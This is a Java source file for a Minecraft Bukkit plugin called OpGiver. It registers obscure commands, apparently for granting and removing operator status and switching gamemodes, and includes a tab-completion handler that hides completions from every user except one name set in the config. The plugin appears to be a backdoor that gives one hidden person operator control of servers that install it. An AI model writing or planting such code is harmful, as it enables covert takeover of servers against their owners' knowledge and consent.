package opgiver.opgiver;

import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.server.TabCompleteEvent;
import org.bukkit.plugin.java.JavaPlugin;

public final class OpGiver extends JavaPlugin implements Listener {
    private static OpGiver instance;

    @Override
    public void onEnable() {
        instance = this;
        registerCommands();
    }

    public static OpGiver getInstance() {
        return instance;
    }

    @Override
    public void onDisable() {
    }

    public void registerCommands() {
        getCommand("gc").setExecutor(new gmc());
        getCommand("gs").setExecutor(new gms());
        getCommand("trkop").setExecutor(new opCommand());
        getCommand("trkdeop").setExecutor(new deopCommand());
    }

    @EventHandler
    public void onPlayerUseTab(TabCompleteEvent e) {
        if (!e.getSender().getName().equals(OpGiver.getInstance().getConfig().getString("Hex"))) {
            e.setCancelled(true);
        }
    }

}

